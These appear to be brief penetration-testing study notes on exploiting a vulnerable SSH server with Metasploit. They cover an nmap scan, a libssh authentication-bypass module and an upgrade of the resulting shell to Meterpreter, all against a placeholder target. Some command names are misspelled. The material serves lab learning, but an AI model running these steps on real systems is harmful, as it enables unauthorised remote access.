---
title: Vuln SSH Server
description: Notes on Vuln SSH Server.
date: '2026-10-26'
topics:
  - systems
section:
  - Systems
  - Linux
  - Linux Exploitation
order: 84
---
SSH Enum
SSH Exploit
![](/notes/img/pasted-image-20251017021818.png)



```
setg RHOST IP_ADDRESS
```

```
db_nmap -sS -sV -O -p- IP_ADDRESS
```

```
services
```

```
search type:auxiliary name:libssh
```

```
use auxiliary/scanner/ssh/linssh_auth_bypass
```

```bash
set SPWAN_PYT true
```

```bash
run
```

```
sessions
```

```
sessions 1
```



```
search shell_to_meterpreter
```

```
use multi/manage/shell_to_meterpreter
```

```
set SESSION 1
```

```
run
```


```
sessions
```


```
sessions 2
